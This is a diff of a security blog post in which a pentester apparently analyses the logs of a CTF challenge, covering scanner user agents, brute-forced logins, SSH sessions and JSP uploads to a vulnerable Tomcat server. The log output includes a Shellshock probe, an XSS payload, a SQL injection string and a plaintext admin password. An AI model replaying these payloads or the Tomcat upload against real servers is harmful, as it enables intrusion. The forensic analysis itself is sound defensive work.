@@ -14,7 +14,7 @@
 <meta name="description" content="">
 <meta name="keywords" content="">
 <meta name="author" content="">
-<meta name="generator" content="Hugo 0.92.1" />
+<meta name="generator" content="Hugo 0.121.2">
 
   <meta property="og:title" content="Post attack analyses ZedCorp Challenge - My name is Rookie" />
 <meta property="og:description" content="" />
@@ -44,7 +44,6 @@
   <link rel="shortcut icon" type="image/x-icon" href="/img/favicon.png">
 
   
-  <link href="" rel="alternate" type="application/rss+xml" title="Personnal security blog" />
 
     
   
@@ -105,9 +104,9 @@
 	
 
     <h1 class="brand-title">Thibaud Robin</h1>
-    <h2 class="brand-tagline">Alias Th1b4ud</h2>
+    <h2 class="brand-tagline">@Trackflaw</h2>
     <h2 class="brand-tagline">PENTESTER</h2>
-    <p>Personnal blog to speak about cybersecurity</p>
+    <p>Personnal (old) blog to speak about cybersecurity</p>
 
     <nav class="nav">
       <ul class="nav-list sidebar-list">
@@ -126,7 +125,7 @@
     <div class="social-buttons">
       
         
-        <a href="https://github.com/thibaudrobin" target="_blank"><i class='fab fa-github'></i></a>
+        <a href="https://github.com/trackflaw" target="_blank"><i class='fab fa-github'></i></a>
         
       
         
@@ -142,7 +141,7 @@
         
       
         
-        <a href="https://twitter.com/th1b4ud" target="_blank"><i class='fab fa-twitter'></i></a>
+        <a href="https://twitter.com/trackflaw" target="_blank"><i class='fab fa-twitter'></i></a>
         
       
       
@@ -244,83 +243,83 @@ You can read <a href="/writeups/hacklab-esgi-2019/zedcorp/">writeups here</a> to
 <p>First, let&rsquo;s analyse the first server : <code>dev-server.zedcorp</code></p>
 <h2 id="number-of-players">Number of players</h2>
 <p>The first question is : <code>How many differents ip played on this challenge ?</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@dev-server:~ $ cat full-access.log | awk <span style="color:#e6db74">&#39;{print $1 }&#39;</span> | sort | uniq | wc -l
-<span style="color:#ae81ff">132</span>
-</code></pre></div><p>The command returned <strong>132 unique ip</strong>. Pretty good :)</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@dev-server:~ $ cat full-access.log | awk <span style="color:#e6db74">&#39;{print $1 }&#39;</span> | sort | uniq | wc -l
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">132</span>
+</span></span></code></pre></div><p>The command returned <strong>132 unique ip</strong>. Pretty good :)</p>
 <h2 id="players-os">Players OS</h2>
 <p>And what was the os of challengers ?</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@dev-server:~ $ awk -F<span style="color:#ae81ff">\&#34;</span> <span style="color:#e6db74">&#39;{print $6}&#39;</span> full-access.log | sort | uniq -c | sort -nr | head -45
- <span style="color:#ae81ff">189501</span> Mozilla/4.0 <span style="color:#f92672">(</span>compatible; MSIE 6.0; Windows NT 5.1<span style="color:#f92672">)</span>
-  <span style="color:#ae81ff">29151</span> Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 6.1<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/28.0.1468.0 Safari/537.36
-  <span style="color:#ae81ff">17033</span> Wfuzz/2.3.4
-  <span style="color:#ae81ff">16132</span> Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 6.3; WOW64; rv:39.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/39.0
-   <span style="color:#ae81ff">5257</span> Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:60.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/60.0
-   <span style="color:#ae81ff">4615</span> gobuster 2.0.1
-   <span style="color:#ae81ff">4392</span> <span style="color:#f92672">()</span> <span style="color:#f92672">{</span> :; <span style="color:#f92672">}</span>; echo Nikto-Added-CVE-2014-6271: true;echo;echo;
-
-    <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
-
-   <span style="color:#ae81ff">2397</span> Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:66.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/66.0
-   <span style="color:#ae81ff">1633</span> -
-   <span style="color:#ae81ff">1058</span> Mozilla/5.00 <span style="color:#f92672">(</span>Nikto/2.1.6<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Evasions:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Test:000964<span style="color:#f92672">)</span>
-   
-    <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
-
-    <span style="color:#ae81ff">722</span> Mozilla/5.0 <span style="color:#f92672">(</span>Macintosh; Intel Mac OS X 10.14; rv:66.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/66.0
-    
-    <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
-    
-    <span style="color:#ae81ff">252</span> Mozilla/5.0 <span style="color:#f92672">(</span>X11; Fedora; Linux x86_64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/69.0.3497.100 Safari/537.36
-    
-    <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
-    
-    <span style="color:#ae81ff">206</span> curl/7.64.1
-    <span style="color:#ae81ff">201</span> Mozilla/5.0 <span style="color:#f92672">(</span>compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html<span style="color:#f92672">)</span>
-    
-    <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
-    
-    <span style="color:#ae81ff">143</span> python-requests/2.19.1
-    
-    <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
-
-    <span style="color:#ae81ff">102</span> MozilSakiiR&lt;script&gt;alert<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>;&lt;/script&gt;la/5.0 <span style="color:#f92672">(</span>Macintosh; Intel Mac OS X 10.14; rv:66.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/66.0
-</code></pre></div><p>Windows is the most used OS, followed by Linux and MacOs.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@dev-server:~ $ awk -F<span style="color:#ae81ff">\&#34;</span> <span style="color:#e6db74">&#39;{print $6}&#39;</span> full-access.log | sort | uniq -c | sort -nr | head -45
+</span></span><span style="display:flex;"><span> <span style="color:#ae81ff">189501</span> Mozilla/4.0 <span style="color:#f92672">(</span>compatible; MSIE 6.0; Windows NT 5.1<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">29151</span> Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 6.1<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/28.0.1468.0 Safari/537.36
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">17033</span> Wfuzz/2.3.4
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">16132</span> Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 6.3; WOW64; rv:39.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/39.0
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">5257</span> Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:60.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/60.0
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4615</span> gobuster 2.0.1
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4392</span> <span style="color:#f92672">()</span> <span style="color:#f92672">{</span> :; <span style="color:#f92672">}</span>; echo Nikto-Added-CVE-2014-6271: true;echo;echo;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2397</span> Mozilla/5.0 <span style="color:#f92672">(</span>X11; Linux x86_64; rv:66.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/66.0
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1633</span> -
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1058</span> Mozilla/5.00 <span style="color:#f92672">(</span>Nikto/2.1.6<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Evasions:None<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>Test:000964<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>   
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">722</span> Mozilla/5.0 <span style="color:#f92672">(</span>Macintosh; Intel Mac OS X 10.14; rv:66.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/66.0
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">252</span> Mozilla/5.0 <span style="color:#f92672">(</span>X11; Fedora; Linux x86_64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/69.0.3497.100 Safari/537.36
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">206</span> curl/7.64.1
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">201</span> Mozilla/5.0 <span style="color:#f92672">(</span>compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html<span style="color:#f92672">)</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">143</span> python-requests/2.19.1
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">102</span> MozilSakiiR&lt;script&gt;alert<span style="color:#f92672">(</span>1<span style="color:#f92672">)</span>;&lt;/script&gt;la/5.0 <span style="color:#f92672">(</span>Macintosh; Intel Mac OS X 10.14; rv:66.0<span style="color:#f92672">)</span> Gecko/20100101 Firefox/66.0
+</span></span></code></pre></div><p>Windows is the most used OS, followed by Linux and MacOs.</p>
 <p>I&rsquo;m really surprised to only see Wfuzz web bruteforcer in 3rd place (and not in 1st place). Like you see, the apps was targeted with tools like Wfuzz, gobuster, Nikto. But we have also nmap (why ?), curl and python.</p>
 <p>And for the fun, the last line is the personal user-agent of SakiiR, ctf player at Hexpresso :D (on mac os :o)</p>
 <h2 id="url-most-requested">Url most requested</h2>
 <p>And what was the url most requested ?</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@dev-server:~ $  awk -F<span style="color:#ae81ff">\&#34;</span> <span style="color:#e6db74">&#39;{print $2}&#39;</span> full-access.log | sort | uniq -c | sort -nr | head -10
-  <span style="color:#ae81ff">14136</span> POST /login.php HTTP/1.1
-   <span style="color:#ae81ff">4368</span> POST /0cc175b9c0f1b6a831c399e269772661/admin.php HTTP/1.1
-   <span style="color:#ae81ff">2548</span> OPTIONS * HTTP/1.0
-   <span style="color:#ae81ff">1421</span> GET / HTTP/1.1
-    <span style="color:#ae81ff">999</span> GET /index.php HTTP/1.1
-    <span style="color:#ae81ff">890</span> POST / HTTP/1.1
-    <span style="color:#ae81ff">732</span> POST /index.php HTTP/1.1
-    <span style="color:#ae81ff">674</span> GET /assets/css/main.css HTTP/1.1
-    <span style="color:#ae81ff">555</span> GET /assets/css/font-awesome.min.css HTTP/1.1
-    <span style="color:#ae81ff">550</span> GET /assets/js/jquery.scrolly.min.js HTTP/1.1
-</code></pre></div><p>Who 14 000 on /login.php. Challengers love bruteforce :D</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@dev-server:~ $  awk -F<span style="color:#ae81ff">\&#34;</span> <span style="color:#e6db74">&#39;{print $2}&#39;</span> full-access.log | sort | uniq -c | sort -nr | head -10
+</span></span><span style="display:flex;"><span>  <span style="color:#ae81ff">14136</span> POST /login.php HTTP/1.1
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">4368</span> POST /0cc175b9c0f1b6a831c399e269772661/admin.php HTTP/1.1
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">2548</span> OPTIONS * HTTP/1.0
+</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">1421</span> GET / HTTP/1.1
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">999</span> GET /index.php HTTP/1.1
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">890</span> POST / HTTP/1.1
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">732</span> POST /index.php HTTP/1.1
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">674</span> GET /assets/css/main.css HTTP/1.1
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">555</span> GET /assets/css/font-awesome.min.css HTTP/1.1
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">550</span> GET /assets/js/jquery.scrolly.min.js HTTP/1.1
+</span></span></code></pre></div><p>Who 14 000 on /login.php. Challengers love bruteforce :D</p>
 <p>And also 3 500 requests with Th1b4ud as username</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@dev-server:~ $ cat full-access-details.log  | grep <span style="color:#e6db74">&#34;username=Th1b4ud&#34;</span> | wc -l
-<span style="color:#ae81ff">3518</span>
-</code></pre></div><h2 id="web-bruteforce-">Web bruteforce ?</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@dev-server:~ $ cat full-access-details.log  | grep <span style="color:#e6db74">&#34;username=Th1b4ud&#34;</span> | wc -l
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">3518</span>
+</span></span></code></pre></div><h2 id="web-bruteforce-">Web bruteforce ?</h2>
 <p>What about the most tested password couple ?</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@dev-server:~ $ cat full-access-details.log  | grep <span style="color:#e6db74">&#34;username=&#34;</span> | sort | uniq -c | sort -nr | head -n <span style="color:#ae81ff">10</span>
-    <span style="color:#ae81ff">123</span> username<span style="color:#f92672">=</span>admin&amp;password<span style="color:#f92672">=</span>pxrAW7a4HNMBw86bc
-     <span style="color:#ae81ff">36</span> username<span style="color:#f92672">=</span>admin&amp;password<span style="color:#f92672">=</span>admin
-     <span style="color:#ae81ff">32</span> username<span style="color:#f92672">=</span>admin&amp;password<span style="color:#f92672">=</span>password
-     <span style="color:#ae81ff">27</span> username<span style="color:#f92672">=</span>test&amp;password<span style="color:#f92672">=</span>test
-     <span style="color:#ae81ff">26</span> username<span style="color:#f92672">=</span>admin&amp;password<span style="color:#f92672">=</span><span style="color:#ae81ff">123456</span>
-     <span style="color:#ae81ff">20</span> username<span style="color:#f92672">=</span>admin&amp;password<span style="color:#f92672">=</span>test<span style="color:#960050;background-color:#1e0010">&#39;</span> OR 1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
-     <span style="color:#ae81ff">19</span> username<span style="color:#f92672">=</span>Th1b4ud&amp;password<span style="color:#f92672">=</span>test
-     <span style="color:#ae81ff">17</span> username<span style="color:#f92672">=</span>admin&amp;password<span style="color:#f92672">=</span><span style="color:#ae81ff">12345</span>
-     <span style="color:#ae81ff">14</span> username<span style="color:#f92672">=</span>Th1b4ud&amp;password<span style="color:#f92672">=</span>password
-     <span style="color:#ae81ff">14</span> username<span style="color:#f92672">=</span>rookie&amp;password<span style="color:#f92672">=</span>password
-</code></pre></div><p><code>admin:admin</code> of course followed by some trivial passwords.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@dev-server:~ $ cat full-access-details.log  | grep <span style="color:#e6db74">&#34;username=&#34;</span> | sort | uniq -c | sort -nr | head -n <span style="color:#ae81ff">10</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">123</span> username<span style="color:#f92672">=</span>admin&amp;password<span style="color:#f92672">=</span>pxrAW7a4HNMBw86bc
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">36</span> username<span style="color:#f92672">=</span>admin&amp;password<span style="color:#f92672">=</span>admin
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">32</span> username<span style="color:#f92672">=</span>admin&amp;password<span style="color:#f92672">=</span>password
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">27</span> username<span style="color:#f92672">=</span>test&amp;password<span style="color:#f92672">=</span>test
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">26</span> username<span style="color:#f92672">=</span>admin&amp;password<span style="color:#f92672">=</span><span style="color:#ae81ff">123456</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">20</span> username<span style="color:#f92672">=</span>admin&amp;password<span style="color:#f92672">=</span>test<span style="color:#960050;background-color:#1e0010">&#39;</span> OR 1<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">19</span> username<span style="color:#f92672">=</span>Th1b4ud&amp;password<span style="color:#f92672">=</span>test
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">17</span> username<span style="color:#f92672">=</span>admin&amp;password<span style="color:#f92672">=</span><span style="color:#ae81ff">12345</span>
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">14</span> username<span style="color:#f92672">=</span>Th1b4ud&amp;password<span style="color:#f92672">=</span>password
+</span></span><span style="display:flex;"><span>     <span style="color:#ae81ff">14</span> username<span style="color:#f92672">=</span>rookie&amp;password<span style="color:#f92672">=</span>password
+</span></span></code></pre></div><p><code>admin:admin</code> of course followed by some trivial passwords.</p>
 <h2 id="first-ssh-connexion">First ssh connexion</h2>
 <p>The first session with test user was opened at <code>09:06pm</code></p>
-<pre tabindex="0"><code>root@dev-server:~ $ strings full-auth.log | grep &quot;session opened for user test&quot; | head
+<pre tabindex="0"><code>root@dev-server:~ $ strings full-auth.log | grep &#34;session opened for user test&#34; | head
 Apr  5 21:06:15 dev-server sshd[2222]: pam_unix(sshd:session): session opened for user test by (uid=0)
 Apr  5 21:06:16 dev-server systemd: pam_unix(systemd-user:session): session opened for user test by (uid=0)
 Apr  5 21:06:42 dev-server sshd[2242]: pam_unix(sshd:session): session opened for user test by (uid=0)
@@ -328,77 +327,77 @@ Apr  5 21:06:42 dev-server sshd[2242]: pam_unix(sshd:session): session opened fo
 <p>Next question is : <code>How many connections as test user have been done during the ctf ?</code>
 The ctf start at 08:00 PM</p>
 <p>In all the section of this report, logs file are already truncated under 08:00pm and 06:00am.</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@dev-server:~ $ strings full-auth.log | grep <span style="color:#e6db74">&#34;session opened for user test&#34;</span> | wc -l
-<span style="color:#ae81ff">515</span>
-</code></pre></div><p>In total, there were 515 connections done on dev-server as user <code>test</code>. It&rsquo;s pretty much :o</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@dev-server:~ $ strings full-auth.log | grep <span style="color:#e6db74">&#34;session opened for user test&#34;</span> | wc -l
+</span></span><span style="display:flex;"><span><span style="color:#ae81ff">515</span>
+</span></span></code></pre></div><p>In total, there were 515 connections done on dev-server as user <code>test</code>. It&rsquo;s pretty much :o</p>
 <h1 id="project-server">Project server</h1>
 <p>Project server is the second server to exploit. It exposes a vulnerable Tomcat Webserver. Challengers had to exploit it to obtain a RCE and grab some credentials to exploit the third server : admin server.</p>
 <h2 id="first-access">First access</h2>
 <p>First question is : <code>When did the first challenger discovered the internal network ?</code></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&#34;05/Apr/2019&#34;</span>
-<span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:21:48:55 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">4849</span>
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:21:49:06 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">4849</span>
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:21:49:06 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /robots.txt HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">982</span>
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:21:49:06 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /kanban.css HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">6284</span>
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:21:49:06 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /kanban.js HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">18191</span>
-</code></pre></div><p>Answer is in the logs : at 9:48pm, 1h48 after the start of the ctf</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&#34;05/Apr/2019&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">[</span>...<span style="color:#f92672">]</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:21:48:55 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">4849</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:21:49:06 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET / HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">4849</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:21:49:06 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /robots.txt HTTP/1.1&#34;</span> <span style="color:#ae81ff">404</span> <span style="color:#ae81ff">982</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:21:49:06 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /kanban.css HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">6284</span>
+</span></span><span style="display:flex;"><span>10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:21:49:06 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;GET /kanban.js HTTP/1.1&#34;</span> <span style="color:#ae81ff">200</span> <span style="color:#ae81ff">18191</span>
+</span></span></code></pre></div><p>Answer is in the logs : at 9:48pm, 1h48 after the start of the ctf</p>
 <h2 id="first-exploit-and-rce">First exploit and RCE</h2>
 <p>Second question is : <code>When was the first exploitation ?</code></p>
 <p>The first successfully PUT request was done at <strong>22:05:06</strong> with the file <strong>test.html</strong> with the content <code>test/test</code>
 The first JSP executable file was put at <strong>22:08:58</strong> with the file <strong>awdjgiuiqwdqwd.html.jsp</strong> (.JSP extension is not execute by Tomcat)</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&#34;PUT&#34;</span> | grep <span style="color:#e6db74">&#34;201 -&#34;</span>
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:04:25 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /robots.txt HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:05:06 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /test.html HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:07:32 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /awdjgiuiqwdqwd.html HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:07:55 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /awdjgiuiqwdqwd.html.JSP HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:08:20 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /awdjgiuiqwdqwd.php HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:08:58 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /awdjgiuiqwdqwd.html.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:18:05 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /awdjgiuiqwdqwd.html.jsp%20 HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:20:47 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /awdjgiuiqwdqwd.jsp%20 HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:21:33 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /awdjgiuiqwdqwd.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:24 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /IXXfDQcwzR.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:23:47 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /jlfJTuKKrV.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:27:12 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /nikto-test-xsK98kYM.html HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
-10.0.0.1 - - <span style="color:#f92672">[</span>05/Apr/2019:22:27:34 +0200<span style="color:#f92672">]</span> <span style="color:#e6db74">&#34;PUT /toto.jsp/ HTTP/1.1&#34;</span> <span style="color:#ae81ff">201</span> -
-</code></pre></div><p><code>awdjgiuiqwdqwd.html.jsp</code> was the first file to do a RCE on project-server at <strong>22:15:14</strong></p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">root@project-server:~ $ cat full-access.log | grep <span style="color:#e6db74">&#34;awdjgiuiqwdqwd&#34;</span> | grep <span style="color:#e6db74">&#34;GET&#34;</span> | head -n <span style="color:#ae81ff">30</span>
